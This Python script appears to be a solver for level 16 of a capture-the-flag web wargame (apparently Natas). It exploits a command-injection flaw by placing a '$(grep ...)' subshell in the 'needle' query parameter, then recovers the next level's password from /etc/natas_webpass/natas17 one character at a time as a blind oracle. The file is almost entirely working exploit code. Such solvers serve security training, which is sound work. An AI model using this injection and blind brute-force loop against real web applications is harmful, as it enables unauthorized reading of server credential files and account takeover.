import string

import requests

from config import password_length
from utils import get_level_url, get_request_object, store_secret_and_print_message

level_number = 16


def get_secret(debug=False):
    char_list = string.ascii_letters + string.digits
    password = ""
    req = get_request_object(level_number)
    url = get_level_url(level_number)

    while True:
        if len(password) == password_length:
            return password

        for i in char_list:
            if debug:
                print(f"checking: {password}{i}")

            try:
                result = req.get(url + f"?needle=hackers$(grep ^{password}{i} /etc/natas_webpass/natas17)")
            except requests.Timeout:
                continue

            if "hackers" not in result.text:
                password += i
                break


secret = get_secret(debug=True)
store_secret_and_print_message(level_number, secret)
